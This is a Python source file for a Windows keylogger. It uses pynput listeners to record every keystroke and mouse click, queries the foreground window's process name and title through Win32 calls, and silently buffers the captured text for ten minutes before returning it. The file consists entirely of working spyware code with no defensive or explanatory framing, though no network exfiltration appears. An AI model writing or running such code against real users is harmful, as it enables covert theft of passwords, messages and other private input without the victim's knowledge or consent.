from pynput import keyboard, mouse
import time
import sys
from io import StringIO
import ctypes
import win32clipboard

TIMEOUT = 60 * 10

class KeyLogger:
    def __init__(self):
        self.current_window = None
        self.keystrokes = []

    def get_current_process(self):
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        psapi = ctypes.windll.psapi

        hwnd = user32.GetForegroundWindow()
        pid = ctypes.c_ulong(0)
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        process_id = pid.value

        executable = ctypes.create_string_buffer(512)
        h_process = kernel32.OpenProcess(0x400 | 0x10, False, process_id)
        psapi.GetModuleBaseNameA(h_process, None, ctypes.byref(executable), 512)
        window_title = ctypes.create_string_buffer(512)
        user32.GetWindowTextA(hwnd, ctypes.byref(window_title), 512)

        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')

        print('\n', process_id, executable.value.decode(), self.current_window)
        kernel32.CloseHandle(hwnd)
        kernel32.CloseHandle(h_process)

    def on_press(self, key):
        if hasattr(key, 'char') and key.char is not None:
            self.keystrokes.append(key.char)
            print(key.char, end='', flush=True)
        elif key == keyboard.Key.space:
            self.keystrokes.append(' ')
            print(' ', end='', flush=True)
        elif key == keyboard.Key.enter:
            self.keystrokes.append('\n')
            print('\n', end='', flush=True)
        else:
            self.keystrokes.append(f'[{key.name}]')
            print(f'[{key.name}]', end='', flush=True)

        # Get the current process info
        self.get_current_process()

    def on_click(self, x, y, button, pressed):
        if button == mouse.Button.left and pressed:
            # Get the current process info when mouse is clicked
            self.get_current_process()

def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    kl = KeyLogger()

    # Setup the listener threads
    keyboard_listener = keyboard.Listener(on_press=kl.on_press)
    mouse_listener = mouse.Listener(on_click=kl.on_click)

    # Start the listeners
    keyboard_listener.start()
    mouse_listener.start()

    start_time = time.time()
    try:
        while time.time() - start_time < TIMEOUT:
            time.sleep(1)  # Add a small delay to prevent excessive CPU usage
    except KeyboardInterrupt:
        pass

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout

    # Stop the listeners
    keyboard_listener.stop()
    mouse_listener.stop()

    return log

if __name__ == '__main__':
    log = run()
    print(log)
    print('done.')
